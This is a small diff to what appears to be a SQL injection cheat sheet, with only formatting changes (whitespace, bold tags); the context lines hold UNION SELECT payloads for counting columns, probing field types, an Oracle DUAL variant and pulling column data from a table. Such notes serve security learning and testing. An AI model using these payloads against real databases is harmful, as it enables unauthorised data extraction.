@@ -117,9 +117,9 @@
 <b>method2:</b><mark>' UNION SELECT NULL--</mark>
 	
 2. get field type
-<mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark> * assuming four columns
+<mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark>* assuming four columns
 <mark>' UNION SELECT NULL,'a',NULL,NULL--</mark>
-<mark>' UNION SELECT 'a','a' FROM DUAL--</mark>	* assuming two columns
+<mark>' UNION SELECT 'a','a' FROM DUAL--</mark>* assuming two columns
 	
 <b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns
 is needed. Also, for ORACLE the select statement is needed a table to search from, it can be any table.
@@ -175,7 +175,7 @@ is needed. Also, for ORACLE the select statement is needed a table to search fro
 <mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark>	
 </details>
 
-NOTE: both ways needs to know the column number, field type and both examples are assuming it has
+<b>NOTE:</b> both ways needs to know the column number, field type and both examples are assuming it has
 two columns and both type string.</p>
 </details>
 <details>
